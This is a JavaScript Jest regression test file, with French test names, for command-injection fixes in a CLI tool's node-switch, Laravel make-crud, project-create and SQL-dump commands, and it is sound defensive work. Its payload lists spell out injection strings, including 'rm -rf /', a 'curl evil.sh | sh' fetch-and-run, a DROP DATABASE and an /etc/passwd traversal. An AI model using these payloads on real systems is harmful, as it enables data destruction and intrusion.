/**
 * Regression tests for the command-injection fixes.
 * Each case below was demonstrably exploitable before validation was added.
 */

const { normalizeVersion, resolveArch } = require('../commands/node-switch');
const { normalizeModel } = require('../commands/laravel/make-crud');
const { validateProjectName, validateVersion } = require('../commands/create');
const { buildDumpCommand } = require('../commands/sql-dump');

const PAYLOADS = [
  '1";touch /tmp/PWNED;"',
  '18.20.4; id',
  '$(id)',
  '`id`',
  '../../../etc/passwd',
  '18.20.4 && rm -rf /',
  '18.20.4\nid',
  '|id'
];

describe('durcissement contre l\'injection de commande', () => {
  describe('node-switch', () => {
    test.each(PAYLOADS)('rejette la charge utile %p', (payload) => {
      expect(() => normalizeVersion(payload)).toThrow(/Version invalide/);
    });

    test.each([['18.20.4'], ['v20.11.0'], ['8.0.0']])('accepte la version %s', (version) => {
      expect(normalizeVersion(version)).toMatch(/^\d+\.\d+\.\d+$/);
    });

    test('retire le préfixe v', () => {
      expect(normalizeVersion('v22.1.0')).toBe('22.1.0');
    });

    test.each([[''], [null], [undefined], ['latest'], ['18'], ['18.20']])(
      'rejette la version incomplète %p',
      (value) => expect(() => normalizeVersion(value)).toThrow()
    );

    test('resolveArch retourne un identifiant nodejs.org connu', () => {
      expect(['x64', 'arm64', 'armv7l', 'ppc64le', 's390x']).toContain(resolveArch());
    });
  });

  describe('laravel make-crud', () => {
    test.each(PAYLOADS.concat(['Product; rm -rf /', 'Pro duct']))(
      'rejette le modèle %p',
      (payload) => expect(() => normalizeModel(payload)).toThrow(/Nom de modèle invalide/)
    );

    test('normalise en StudlyCase', () => {
      expect(normalizeModel('product')).toBe('Product');
      expect(normalizeModel('Invoice2')).toBe('Invoice2');
    });
  });

  describe('create', () => {
    test.each(PAYLOADS.concat(['app; curl evil.sh | sh', 'my app']))(
      'rejette le nom de projet %p',
      (payload) => expect(() => validateProjectName(payload)).toThrow(/Nom de projet invalide/)
    );

    test.each([['my-app'], ['my_app'], ['app.v2'], ['App123']])(
      'accepte le nom %s',
      (name) => expect(validateProjectName(name)).toBe(name)
    );

    test.each([['.'], ['..']])('rejette %p', (name) => {
      expect(() => validateProjectName(name)).toThrow();
    });

    test('rejette une version malformée', () => {
      expect(() => validateVersion('latest; id')).toThrow(/Version invalide/);
    });

    test('accepte une version vide (défaut du framework)', () => {
      expect(validateVersion('')).toBe('');
    });
  });

  describe('sql-dump', () => {
    const config = {
      driver: 'mysql',
      host: '127.0.0.1',
      port: '3306',
      database: 'app',
      username: 'root',
      password: 'S3cr3t!',
      service: 'db'
    };

    // Regression: the password used to sit on the command line, visible in `ps`
    test('ne place jamais le mot de passe dans argv (mysql)', () => {
      const { args, env } = buildDumpCommand(config, false);
      expect(args.join(' ')).not.toContain('S3cr3t!');
      expect(env.MYSQL_PWD).toBe('S3cr3t!');
    });

    test('ne place jamais le mot de passe dans argv (postgres)', () => {
      const { file, args, env } = buildDumpCommand({ ...config, driver: 'pgsql' }, false);
      expect(file).toBe('pg_dump');
      expect(args.join(' ')).not.toContain('S3cr3t!');
      expect(env.PGPASSWORD).toBe('S3cr3t!');
    });

    test('passe les identifiants en arguments discrets', () => {
      const { args } = buildDumpCommand(config, false);
      expect(args).toContain('--user');
      expect(args[args.indexOf('--user') + 1]).toBe('root');
      // A hostile database name stays a single argv entry, never shell syntax
      const hostile = buildDumpCommand({ ...config, database: 'app; DROP DATABASE x' }, false);
      expect(hostile.args).toContain('app; DROP DATABASE x');
    });

    test('route via docker compose sans shell', () => {
      const { file, args } = buildDumpCommand(config, true);
      expect(file).toBe('docker');
      expect(args.slice(0, 3)).toEqual(['compose', 'exec', '-T']);
      expect(args).toContain('mysqldump');
    });

    test('rejette un SGBD non supporté', () => {
      expect(() => buildDumpCommand({ ...config, driver: 'oracle' }, false)).toThrow(/non supporté/);
    });
  });
});
